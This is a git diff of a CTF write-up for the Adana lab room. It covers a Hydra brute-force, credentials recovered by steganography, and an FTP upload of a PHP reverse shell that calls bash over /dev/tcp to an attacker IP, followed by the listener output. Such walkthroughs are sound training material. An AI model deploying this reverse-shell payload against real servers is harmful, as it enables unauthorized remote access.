@@ -73,6 +73,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-21 18:42:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 18:42:13
 ```
 
+## Finding secrets in the image
 Let's try if we can do some steganography on the JPG-file we downloaded.
 For this we can use stegseek:
 ```
@@ -90,6 +91,7 @@ $ cat extracted_stegseek
 RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
 ```
 
+## Poking around the FTP server
 Looks like a base64-encoded string, what do we get if we decode it?
 ```
 FTP-LOGIN
@@ -303,10 +305,6 @@ exit
 So we are in a home-directory, and it looks like someone else have been poking
 around. 
 
-Now I'm lost on how to continue, so I'll peek in one of the write-ups.
-It hints that having a more thorough look in the phpmyadmin database will show
-some leads.
-
 In the wp-options table in phpmyadmin1 we find that there is a line that reveals
 a subdomain:
 ```
@@ -399,3 +397,56 @@ We now find subdomains that does not match the size 10846.
 
 Although when we try to navigate to it, Firefox doesn't find the page, so lets
 add it to /etc/hosts.
+
+# Obtaining a reverse shell
+We can now navigate to the http://subdomain.adana.thm, and it contains the post
+that we found in the phpmyadmin1 database. Let's see if my theory regarding the
+FTP server was correct.
+
+So let's upload a file using ftp, and see if we can navigate to it.
+Yup, uploading a test.html and making it readable (chmod 777 test.html) works,
+and we are able to see the html page. So lets see if we can upload a reverse shell.
+```
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.21.85/4444 0>&1'");?>
+
+```
+Uploading this as revshell.php and navigating to http://subdomain.adana.thm/revshell.php
+does indeed get us a reverse shell:
+```
+$ nc -lvnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.156.108.
+Ncat: Connection from 10.10.156.108:48746.
+bash: cannot set terminal process group (886): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/subdomain$
+```
+
+When trying to stabilize the shell, we notice something interesting:
+```
+www-data@ubuntu:/var/www/subdomain$ export $SHELL=bash
+bash: export: `/usr/sbin/nologin=bash': not a valid identifier
+```
+It probably doesn't matter, but it's an interesting sidenote.
+
+And now, for once, I manage to get a proper stable shell, with tab completion
+and command history. The different is that this time I did
+```
+export $TERM=xterm # instead of xterm-256color
+```
+I can even use Ctrl-C! No more accidentally closing the shell.
+
+By running ```id``` we get some info on who we are:
+```
+www-data@ubuntu:/var/www/subdomain$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+And we find the webflag:
+```
+/var/www/html/wwe3bbfla4g.txt
+```
+Let's see if we also can find the secret directory the room is asking for, but
+that, as well as the priv esc is a thing for tomorrow.
